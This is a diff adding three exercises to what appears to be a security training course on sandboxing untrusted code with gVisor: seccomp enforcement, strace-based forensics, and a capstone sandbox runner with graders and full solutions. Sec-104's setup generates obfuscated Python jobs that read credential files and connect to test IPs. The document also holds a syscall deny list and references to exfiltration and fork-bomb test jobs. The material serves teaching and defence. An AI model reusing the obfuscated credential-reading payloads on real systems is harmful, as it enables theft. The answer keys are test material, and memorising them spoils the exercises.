+    Defence in depth: **`/lab/sandbox-seccomp.json`** denies the system calls
+    container escapes usually start with (`ptrace`, `unshare`, `mount`,
+    `keyctl`, `bpf`, …) and **`/lab/run-job.sh`** passes it to every job with
+    `--security-opt seccomp=`. A pentest just showed a job calling `ptrace`
+    and `unshare` successfully.
+
+    Make the profile **actually apply** to jobs: every call it denies must
+    fail with **`EPERM`** inside a job. Jobs must still run under **gVisor**,
+    with everything else as it is.
+  hints:
+    - "Write a job that calls `ptrace(PTRACE_TRACEME)` through `ctypes`: it returns 0."
+    - "runsc enforces container seccomp profiles only with one flag; `runsc help flags 2>&1 | grep -i seccomp`."
+    - "Add `\"runtimeArgs\": [\"--oci-seccomp\"]` to the runsc runtime (or register a second one) and restart Docker."
+  solution: |
+    ```bash
+    sudo jq '.runtimes.runsc.runtimeArgs = ["--oci-seccomp"]' /etc/docker/daemon.json | sudo tee /etc/docker/daemon.json.new >/dev/null
+    sudo mv /etc/docker/daemon.json.new /etc/docker/daemon.json
+    sudo systemctl restart docker
+    ```
+    Or register `runsc-strict` with `sudo runsc install --runtime runsc-strict -- --oci-seccomp`
+    and use `--runtime runsc-strict` in the runner.
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    lab_file /lab/sandbox-seccomp.json <<'EOF'
+    {
+      "defaultAction": "SCMP_ACT_ALLOW",
+      "syscalls": [
+        {
+          "names": ["ptrace", "unshare", "setns", "mount", "umount2", "keyctl", "add_key", "request_key", "bpf", "userfaultfd", "perf_event_open"],
+          "action": "SCMP_ACT_ERRNO",
+          "errnoRet": 1
+        }
+      ]
+    }
+    EOF
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --security-opt seccomp=/lab/sandbox-seccomp.json \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  check: |
+    gv_run syscalls
+    check_eq "the job ran" "$GV_RC" 0
+    for c in ptrace unshare mount keyctl add_key bpf userfaultfd; do
+      check_eq "$c is refused with EPERM" "$(gj syscalls.json ".$c")" EPERM
+    done
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "with the right answer, as uid 65534, under gVisor" \
+      "$(gj result.json '"\(.sum) \(.uid) \(.kernel | test("gvisor"))"')" "$(gv_sum) 65534 true"
+    gv_inspect
+    check "the job's runtime is runsc" '[ "$(docker info --format "{{json .Runtimes}}" | jq -r --arg r "$(gi .HostConfig.Runtime)" ".[\$r].path")" = /usr/local/bin/runsc ]'
+    check "the profile is still the one in /lab/sandbox-seccomp.json" 'gi ".HostConfig.SecurityOpt[]?" | grep -q userfaultfd'
+  solve: |
+    sudo jq '.runtimes.runsc.runtimeArgs = ["--oci-seccomp"]' /etc/docker/daemon.json | sudo tee /etc/docker/daemon.json.new >/dev/null
+    sudo mv /etc/docker/daemon.json.new /etc/docker/daemon.json
+    sudo systemctl restart docker
+  deliverables: [run-job.sh]
+
+- id: sec-104
+  title: What did that job try to do?
+  difficulty: 3
+  kind: build
+  tags: [gvisor, runsc, strace, forensics, investigation, logs]
+  tutorial: |
+    **What you're learning.** Recording every system call a sandboxed job makes with runsc's built-in strace, and reading the log to see what obfuscated code really did.
+
+    ### The idea
+
+    Untrusted code is often **obfuscated**: a base64 blob, `zlib`, `exec`. Reading it is slow, and the code can decide at run time what to do. Its **system calls** can't hide: whatever the code is dressed up as, opening a file means an `openat` with a path, and calling home means a `connect` with an address.
+
+    Because the Sentry *is* the job's kernel, runsc can log every system call without `ptrace` and without the job noticing. Register a runtime with:
+
+    ```bash
+    sudo runsc install --runtime runsc-trace -- --strace --debug-log=/var/log/runsc/%ID%/
+    sudo systemctl restart docker
+    ```
+
+    `%ID%` becomes the container's full id, one folder per container. The Sentry's log is `runsc.log.*.boot.txt`. `--strace-syscalls=openat,connect` narrows what's recorded. Each call shows up twice, **E**ntering and e**X**iting with its result:
+
+    ```
+    strace.go:571] [   1:   1] python3 E openat(AT_FDCWD /, 0xfd66b4f8cd50 /home/app/.netrc, O_RDONLY|O_CLOEXEC, 0o0)
+    strace.go:609] [   1:   1] python3 X openat(...) = -1 errno=2 (no such file or directory) (12µs)
+    strace.go:568] [   1:   1] python3 E connect(0x3 socket:[1], 0xfdff... {Family: AF_INET, Addr: 192.0.2.80, Port: 8081}, 0x10)
+    ```
+
+    `[ 1: 1]` is the thread group and thread id inside the sandbox. Calls that failed are still logged: the attempt is the evidence.
+
+    ```bash
+    sudo grep -h ' E openat' /var/log/runsc/ID/*.boot.txt | grep -oE '0x[0-9a-f]+ /[^,]+' | awk '{print $2}' | sort -u
+    sudo grep -h ' E connect' /var/log/runsc/ID/*.boot.txt | grep -oE 'Addr: [^,]+, Port: [0-9]+'
+    ```
+
+    Python opens hundreds of files just to start (its standard library), so look for paths that aren't Python's: home directories, `/root`, `/etc` secrets.
+
+    ### Common mistakes
+
+    - Reading the wrong container's log: match the folder name to the container id.
+    - Taking the job's source for the truth: here it says nothing useful until decoded, while the log says exactly what ran.
+    - Leaving `--strace` on for every job: it slows them down and the logs grow fast. Keep a separate runtime for investigations.
+
+    ### Check your work
+
+    The path and the address you found appear on `E` lines of the flagged job's boot log.
+  scenario: |
+    Three jobs ran overnight under an investigation runtime, **`runsc-trace`**
+    (runsc with `--strace`, logs in **`/var/log/runsc/<container id>/`**,
+    `sudo` to read). **`/lab/runs.log`** lists each job, its container id and
+    its exit code. The job named in **`/lab/flagged.txt`** set off an alert;
+    its code is in **`/lab/jobs/<name>/main.py`**, and it's obfuscated.
+
+    From the system call log, find what the flagged job tried to do, and
+    write **`/lab/findings.txt`**:
+
+    ```
+    file=<the credentials file it tried to read, full path>
+    connect=<the address it tried to connect to>:<port>
+    ```
+  hints:
+    - "The flagged job's line in `runs.log` gives its container id, and that's the folder name under `/var/log/runsc/`."
+    - "`sudo grep -h ' E openat' /var/log/runsc/ID/*boot.txt | grep -v /usr/local/lib/python`"
+    - "`sudo grep -h ' E connect' /var/log/runsc/ID/*boot.txt`"
+  solution: |
+    ```bash
+    id=$(awk -v j="$(cat /lab/flagged.txt)" '$2 == j {print $3}' /lab/runs.log)
+    log=$(sudo sh -c "ls /var/log/runsc/$id/*.boot.txt")
+    f=$(sudo grep -h ' E openat' $log | grep -oE '0x[0-9a-f]+ /(root|home)/[^,]+' | awk '{print $2}' | head -1)
+    c=$(sudo grep -h ' E connect' $log | grep -oE 'Addr: [0-9.]+, Port: [0-9]+' | head -1 | sed -E 's/Addr: ([0-9.]+), Port: /\1:/')
+    printf 'file=%s\nconnect=%s\n' "$f" "$c" > /lab/findings.txt
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc-trace --strace --debug-log=/var/log/runsc/%ID%/
+    on_reset 'rm -rf /var/log/runsc'
+    creds=$(printf '%s\n' /root/.aws/credentials /root/.docker/config.json /root/.config/gh/hosts.yml /root/.git-credentials /home/ci/.netrc /root/.kube/config | shuf)
+    f1=$(sed -n 1p <<<"$creds"); f2=$(sed -n 2p <<<"$creds")
+    ip1=203.0.113.$(shuf -i 10-250 -n 1); port1=$(shuf -e 4444 8443 9001 31337 5555 -n 1)
+    ip2=198.51.100.$(shuf -i 10-250 -n 1)
+    printf 'file=%s\nconnect=%s:%s\n' "$f1" "$ip1" "$port1" >"$KL_STATE/answer"
+    payload() {  # FILE IP PORT -> an obfuscated main.py that reads FILE and connects to IP:PORT
+      python3 - "$1" "$2" "$3" <<'PY'
+    import base64, sys, zlib
+    f, ip, port = sys.argv[1:]
+    a = [int(x) for x in ip.split(".")]
+    code = f"""
+    import socket
+    p = "".join(map(chr, {[ord(c) for c in f]!r}))
+    for x in ["/etc/hostname", "/job/input.txt", p]:
+        try:
+            open(x).read()
+        except Exception:
+            pass
+    s = socket.socket(); s.settimeout(1)
+    try:
+        s.connect((".".join(map(str, {a!r})), {int(port)}))
+    except Exception:
+        pass
+    print("report ready")
+    """
+    blob = base64.b64encode(zlib.compress(code.encode())).decode()
+    print("# report generator v2 (compiled)\nimport base64, zlib\nexec(zlib.decompress(base64.b64decode(\n    \"" + blob + "\")))")
+    PY
+    }
+    names=$(printf 'job-%s\n' $(openssl rand -hex 3) $(openssl rand -hex 3) $(openssl rand -hex 3))
+    flagged=$(sed -n 2p <<<"$names")
+    mkdir -p /lab/jobs
+    : >/lab/runs.log
+    for n in $names; do
+      mkdir -p "/lab/jobs/$n"
+      seq 1 30 | tr '\n' ' ' >"/lab/jobs/$n/input.txt"
+      if [ "$n" = "$flagged" ]; then payload "$f1" "$ip1" "$port1" >"/lab/jobs/$n/main.py"
+      elif [ "$n" = "$(sed -n 1p <<<"$names")" ]; then payload "$f2" "$ip2" 443 >"/lab/jobs/$n/main.py"
+      else cp "$GV_KIT/jobs/normal.py" "/lab/jobs/$n/main.py"; fi
+      mkdir -p "/tmp/kl-out-$n" && chmod 777 "/tmp/kl-out-$n"
+      cid=$(docker run -d --runtime runsc-trace --network none --user 65534:65534 \
+        -v "/lab/jobs/$n:/job:ro" -v "/tmp/kl-out-$n:/out" -e JOB_ID="$n" "$GV_IMAGE" python3 /job/main.py)
+      rc=$(timeout 60 docker wait "$cid")
+      docker rm -f "$cid" >/dev/null
+      echo "$(date -u +%FT%TZ) $n $cid exit=$rc" >>/lab/runs.log
+      rm -rf "/tmp/kl-out-$n"
+    done
+    echo "$flagged" >/lab/flagged.txt
+    chown -R "$(lab_user)": /lab
+  check: |
+    want_f=$(sed -n 's/^file=//p' "$KL_STATE/answer"); want_c=$(sed -n 's/^connect=//p' "$KL_STATE/answer")
+    got_f=$(sed -n 's/^file=//p' /lab/findings.txt 2>/dev/null | tr -d ' \r'); got_c=$(sed -n 's/^connect=//p' /lab/findings.txt 2>/dev/null | tr -d ' \r')
+    check_eq "findings.txt names the credentials file the flagged job tried to read" "$got_f" "$want_f"
+    check_eq "findings.txt names the address it tried to connect to" "$got_c" "$want_c"
+  solve: |
+    id=$(awk -v j="$(cat /lab/flagged.txt)" '$2 == j {print $3}' /lab/runs.log)
+    log=$(sudo sh -c "ls /var/log/runsc/$id/*.boot.txt")
+    f=$(sudo grep -h ' E openat' $log | grep -oE '0x[0-9a-f]+ /(root|home)/[^,]+' | awk '{print $2}' | head -1)
+    c=$(sudo grep -h ' E connect' $log | grep -oE 'Addr: [0-9.]+, Port: [0-9]+' | head -1 | sed -E 's/Addr: ([0-9.]+), Port: /\1:/')
+    printf 'file=%s\nconnect=%s\n' "$f" "$c" > /lab/findings.txt
+  deliverables: [findings.txt]
+
+# ===== Capstone =====
+
+- id: sec-105
+  title: "Capstone: a sandbox for code you didn't write"
+  difficulty: 4
+  kind: build
+  tags: [gvisor, runsc, sandbox, nftables, seccomp, capstone]
+  tutorial: |
+    **What you're doing.** Building the whole sandbox runner from nothing, every layer of this module together, and checking it against hostile jobs.
+
+    ### Method
+
+    Work layer by layer and test each one with a small job of your own before you move on. `mkdir -p /tmp/o && /lab/run-job.sh DIR /tmp/o; echo $?` is your test loop.
+
+    | layer | what it stops | exercise |
+    |---|---|---|
+    | `runsc` runtime | kernel exploits reaching the host kernel | sec-093 |
+    | own network + nftables allow-list | exfiltration, metadata credentials, the host's services | sec-095, sec-102 |
+    | `--read-only`, `--tmpfs /tmp:size=`, `:ro` input | tampering, disk filling | sec-096 |
+    | `--user`, `--cap-drop ALL`, `no-new-privileges` | root inside, setuid helpers | sec-097 |
+    | `--memory`/`--memory-swap`, `--cpus` | starving the host | sec-098 |
+    | `docker run -d` + `timeout docker wait` + `rm -f` + `trap` | jobs that never end | sec-099 |
+    | `--pids-limit` (generous) + `--ulimit nproc` | fork bombs, without killing the Sentry | sec-100 |
+    | only `/job`, `/out`, `JOB_ID` | secrets in mounts, environment, the Docker socket | sec-101 |
+    | `--oci-seccomp` + the profile | escape-shaped syscalls, as a second layer | sec-103 |
+
+    Where gVisor surprised you, note it: `--pids-limit` counts the Sentry's threads, seccomp profiles are ignored without `--oci-seccomp`, Docker's DNS doesn't answer inside runsc, setuid bits are ignored.
+
+    **Beyond one host.** Kubernetes runs gVisor through a `RuntimeClass` (`handler: runsc`) that pods pick with `runtimeClassName`. **Firecracker** microVMs (Kata Containers, AWS Lambda) give each job a real kernel in its own VM, a stronger boundary at a higher cost, and they need hardware virtualization (on this Mac's VM that means nested virtualization, M3 or newer). The runner you write here is the same idea, whichever boundary sits underneath.
+
+    ### Check your work
+
+    Before running the check, try at least: a job that never ends, one that forks forever, one that reads `/etc/hostname`'s neighbours and `os.environ`, and one that downloads from the mirror.
+  scenario: |
+    Build **`/lab/run-job.sh JOBDIR OUTDIR`** from scratch (there's a stub).
+    It runs `JOBDIR/main.py` with `python3` from image **`kl-job:1`**, and:
+
+    1. under **gVisor** (`runsc` is registered with Docker; register more
+       runtimes if you need them);
+    2. on a Docker network named **`sandbox`** whose traffic reaches **only
+       TCP `10.99.0.10:8080`** (the package mirror), through an nftables table
+       **`inet sandbox`**: nothing else, and **nothing on this host**;
+    3. with a **read-only** root filesystem, a **`/tmp`** of at most 64 MiB,
+       its folder at **`/job` read-only** and OUTDIR at **`/out`**, the only
+       other mount;
+    4. as **uid 65534**, with **no capabilities** and **no-new-privileges**;
+    5. with at most **256 MiB** of memory and no swap, at most **one CPU**,
+       and at most **32 processes** (16-worker jobs must work); keep a pids
+       cgroup limit for the host;
+    6. with **`JOB_ID`** (the folder's name) as the **only** variable it
+       passes; nothing from `/lab/ci.env`, no Docker socket;
+    7. with **`/lab/sandbox-seccomp.json` enforced**: those calls fail with `EPERM`;
+    8. for at most **30 seconds**: then the job is removed and the runner exits
+       **124**; otherwise the runner prints the job's output and exits with
+       its exit code. **No container is ever left behind.**
+  hints:
+    - "Start from the runner you finished in sec-099 and add the layers of sec-100 to sec-103."
+    - "Do the host-side setup first: the network, the nftables table, `--oci-seccomp` on the runtime, then a Docker restart."
+    - "Test each layer with a two-line job of your own before running the check: the check runs a dozen hostile jobs and takes a few minutes."
+  solution: |
+    ```bash
+    sudo jq '.runtimes.runsc.runtimeArgs = ["--oci-seccomp"]' /etc/docker/daemon.json | sudo tee /etc/docker/daemon.json.new >/dev/null
+    sudo mv /etc/docker/daemon.json.new /etc/docker/daemon.json
+    sudo systemctl restart docker
+    docker network create -o com.docker.network.bridge.name=sbx0 \
+      -o com.docker.network.bridge.enable_icc=false --subnet 172.31.0.0/24 sandbox
+    sudo nft -f - <<'NFT'
+    table inet sandbox {
+      chain egress {
+        type filter hook forward priority -10; policy accept;
+        iifname "sbx0" ip daddr 10.99.0.10 tcp dport 8080 accept
+        iifname "sbx0" drop
+      }
+      chain to_host {
+        type filter hook input priority -10; policy accept;
+        iifname "sbx0" drop
+      }
+    }
+    NFT
+    ```
+
+    ```bash
+    #!/bin/bash
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=30
+    cid=$(docker run -d --runtime runsc --network sandbox \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --security-opt seccomp=/lab/sandbox-seccomp.json \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    gv_outside
+    on_reset 'nft delete table inet sandbox 2>/dev/null'
+    tok=ghp_$(openssl rand -hex 18); host=HOST-SECRET-$(openssl rand -hex 8)
+    printf '%s\n' "$tok" "$host" >"$KL_STATE/secrets"
+    lab_file /lab/ci.env 0600 <<EOF
+    GITHUB_TOKEN=$tok
+    EOF
+    install -m 600 /dev/null /etc/kl-host-secret
+    echo "$host" >/etc/kl-host-secret
+    on_reset 'rm -f /etc/kl-host-secret'
+    lab_file /lab/sandbox-seccomp.json <<'EOF'
+    {
+      "defaultAction": "SCMP_ACT_ALLOW",
+      "syscalls": [
+        {
+          "names": ["ptrace", "unshare", "setns", "mount", "umount2", "keyctl", "add_key", "request_key", "bpf", "userfaultfd", "perf_event_open"],
+          "action": "SCMP_ACT_ERRNO",
+          "errnoRet": 1
+        }
+      ]
+    }
+    EOF
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # TODO: this is no sandbox yet (see /lab/TASK.md).
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    exec docker run --rm -v "$job":/job -v "$out":/out kl-job:1 python3 /job/main.py
+    EOF
+  check: |
+    docker ps -aq --filter label=kl.pwn | xargs -r docker rm -f >/dev/null
+    docker ps -aq --filter ancestor=kl-job:1 | xargs -r docker rm -f >/dev/null  # earlier runs' leftovers
+    gv_run normal
+    check_eq "a normal job succeeds with the right answer" "$GV_RC $(gj result.json .sum)" "0 $(gv_sum)"
+    check_match "under gVisor" "$(gj result.json .kernel)" gvisor
+    check_eq "as uid 65534 with no capabilities" "$(gj result.json '"\(.uid) \(.cap_eff)"')" "65534 0000000000000000"
+    check_eq "with its JOB_ID and no other variables from the runner" \
+      "$(gj result.json '.job_id + " " + ([.env[] | select(IN("PATH","HOSTNAME","HOME","LANG","TERM","GPG_KEY","PYTHON_VERSION","PYTHON_SHA256","JOB_ID") | not)] | join(","))')" "$GV_JOB "
+    check_eq "and a working /tmp" "$(gj result.json .tmp_ok)" true
+    gv_job fetch <<'PY'
+    import urllib.request
+    url = "http://10.99.0.10:8080/packages/kl-tools-1.4.2.txt"
+    open("/out/pkg.txt", "w").write(urllib.request.urlopen(url, timeout=5).read().decode())
+    PY
+    gv_run fetch
+    check "a job can download from the mirror" '[ "$GV_RC" = 0 ] && grep -qF "$(gv_token mirror)" "$GV_OUT/pkg.txt"'
+    gv_run net
+    for t in exfil meta internet host_ssh; do
+      check_match "network: $t is blocked" "$(gj net.json ".$t")" '^blocked'
+    done
+    check_eq "the attacker's server and the metadata service received nothing" "$(gv_hits exfil) $(gv_hits meta)" "0 0"
+    gv_run writes
+    check_eq "files: /etc, site-packages, the input and a 256 MiB /tmp file are refused; /out works" \
+      "$(gj fs.json '[.etc, .site_packages, .input, .tmp_256mb, .out] | map(sub(": .*"; "")) | join(" ")')" "blocked blocked blocked blocked succeeded"
+    gv_run escalate
+    check_eq "the setuid helper doesn't make the job root" "$(gj escalate.json .became_root)" false
+    gv_run syscalls
+    check_eq "the seccomp profile is enforced" "$(gj syscalls.json '[.[]] | unique | join(" ")')" EPERM
+    gv_run loot
+    check_not "no secrets reach the job (environment, files, Docker socket)" \
+      'grep -qF -e "$(sed -n 1p "$KL_STATE/secrets")" -e "$(sed -n 2p "$KL_STATE/secrets")" "$GV_OUT/loot.txt" || grep -q "^docker ESCAPED" "$GV_OUT/loot.txt"'
+    check "the loot job did run" '[ -s "$GV_OUT/loot.txt" ]'
+    gv_run memhog 90
+    check_eq "a job that takes 2 GiB is killed (exit 137)" "$GV_RC" 137
+    gv_run pool
+    check_eq "a 16-worker job works" "$GV_RC $(gj pool.json .workers)" "0 16"
+    gv_run forkbomb
+    n=$(gj fork.json .forked)
+    check "a fork bomb gets at most 32 processes and the runner returns" '[ "$GV_RC" != 124 ] && [ -n "$n" ] && [ "$n" != null ] && [ "$n" -le 32 ]'
+    gv_job exit7 <<'PY'
+    import sys
+    print("seven")
+    sys.exit(7)
+    PY
+    gv_run exit7
+    check "the runner exits with the job's code and shows its output" '[ "$GV_RC" = 7 ] && grep -q seven "$GV_LOG"'
+    gv_run forever 70
+    check "a job that never ends: exit 124 within 35 seconds" '[ "$GV_RC" = 124 ] && [ "$GV_SECS" -le 35 ] && [ "$GV_SECS" -ge 28 ]'
+    sleep 2
+    check_eq "no job container is left behind" "$(docker ps -aq --filter ancestor=kl-job:1 | wc -l) $(docker ps -aq --filter label=kl.pwn | wc -l)" "0 0"
+    gv_inspect
+    check_eq "the container: runtime, network, read-only root, memory, swap" \
+      "$(gi '"\(.HostConfig.Runtime) \(.HostConfig.NetworkMode) \(.HostConfig.ReadonlyRootfs) \(.HostConfig.Memory) \(.HostConfig.MemorySwap)"')" \
+      "runsc sandbox true 268435456 268435456"
+    check_eq "its mounts: /job read-only and /out" "$(gi '[.Mounts[] | "\(.Destination):\(.RW)"] | sort | join(" ")')" "/job:false /out:true"
+    check "no-new-privileges, all capabilities dropped, a pids limit" \
+      'gi ".HostConfig.SecurityOpt[]?" | grep -qE "^no-new-privileges(:true|=true)?$" && gi ".HostConfig.CapDrop[]?" | grep -qiE "^(CAP_)?ALL$" && [ "$(gi ".HostConfig.PidsLimit // 0")" -gt 0 ]'
+  solve: |
+    sudo jq '.runtimes.runsc.runtimeArgs = ["--oci-seccomp"]' /etc/docker/daemon.json | sudo tee /etc/docker/daemon.json.new >/dev/null
+    sudo mv /etc/docker/daemon.json.new /etc/docker/daemon.json
+    sudo systemctl restart docker
+    docker network create -o com.docker.network.bridge.name=sbx0 \
+      -o com.docker.network.bridge.enable_icc=false --subnet 172.31.0.0/24 sandbox
+    sudo nft -f - <<'NFT'
+    table inet sandbox {
+      chain egress {
+        type filter hook forward priority -10; policy accept;
+        iifname "sbx0" ip daddr 10.99.0.10 tcp dport 8080 accept
+        iifname "sbx0" drop
+      }
+      chain to_host {
+        type filter hook input priority -10; policy accept;
+        iifname "sbx0" drop
+      }
+    }
+    NFT
+    cat > /lab/run-job.sh <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=30
+    cid=$(docker run -d --runtime runsc --network sandbox \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --security-opt seccomp=/lab/sandbox-seccomp.json \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  deliverables: [run-job.sh]
